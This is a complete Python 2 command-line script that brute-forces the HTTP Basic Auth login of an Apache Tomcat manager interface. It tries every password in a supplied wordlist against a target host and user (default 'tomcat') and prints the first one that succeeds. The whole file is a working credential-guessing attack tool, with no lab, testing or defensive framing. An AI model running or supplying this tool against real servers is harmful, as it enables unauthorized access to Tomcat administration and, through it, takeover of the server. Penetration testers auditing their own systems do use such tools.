#!/usr/bin/env python
#-*- coding:utf-8 -*-
import argparse
import requests
from requests.auth import HTTPBasicAuth

def brute_password(url,user,passfile):
    pass_lines = None
    with open(passfile) as f:
        pass_lines = f.readlines()
    for line in pass_lines:
        line = line.strip()
        r = requests.get(url,auth=(user,line))
        if r.status_code == requests.codes.ok:
            print 'find user and password->%s:%s'%(user,line)
            return line
    print 'no password find for user:%s'%user
    return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='tomcat host and port(eg -> 172.16.80.1:8080)', required=True)
    parser.add_argument('-u', '--user', help='tomcat admin user,default is tomcat',default='tomcat',required=False)
    parser.add_argument('-f', '--passfile',help='the password file to test',default='no.war',required=True)
   
    args = parser.parse_args()

    url = 'http://%s/manager/html'%(args.target)
    brute_password(url,args.user,args.passfile)

if __name__ == '__main__':
    main()

